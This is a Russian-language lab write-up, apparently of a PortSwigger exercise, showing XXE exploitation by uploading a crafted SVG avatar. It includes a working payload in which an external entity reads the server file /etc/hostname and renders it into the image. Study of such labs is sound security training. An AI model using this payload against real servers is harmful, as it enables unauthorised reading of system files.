# Exploiting XXE via image file upload

## Theory

<h3>XXE-атаки через загрузку файлов</h3>

Некоторые приложения позволяют пользователям загружать файлы, которые затем обрабатываются на стороне сервера. Некоторые распространенные форматы файлов используют XML или содержат подкомпоненты XML. Примерами форматов на основе XML являются форматы офисных документов, такие как DOCX, и форматы изображений, такие как SVG.

Например, приложение может разрешить пользователям загружать изображения и обрабатывать или проверять их на сервере после загрузки. Даже если приложение ожидает получить такой формат, как PNG или JPEG, используемая библиотека обработки изображений может поддерживать изображения SVG. Поскольку формат SVG использует XML, злоумышленник может отправить вредоносное изображение SVG и, таким образом, получить доступ к скрытой поверхности атаки для обнаружения уязвимостей XXE.

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_via_image_file_upload/assets/1.png)

Перейдем к посту и спустимся в низ страницы. У нас есть поле для загрузки аватара.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_via_image_file_upload/assets/2.png)

Создадим файл с расширением .svg и запишем в файл вредоносный код. Загрузим файл. Вредоносный код:
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_via_image_file_upload/assets/3.png)

Вернемся к посту. Теперь мы можем заметить, что аватар изменился.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_via_image_file_upload/assets/4.png)

Откроем картнку в новой вкладке.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_via_image_file_upload/assets/5.png)

Подтверждаем ответ и получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Exploiting_XXE_via_image_file_upload/assets/6.png)
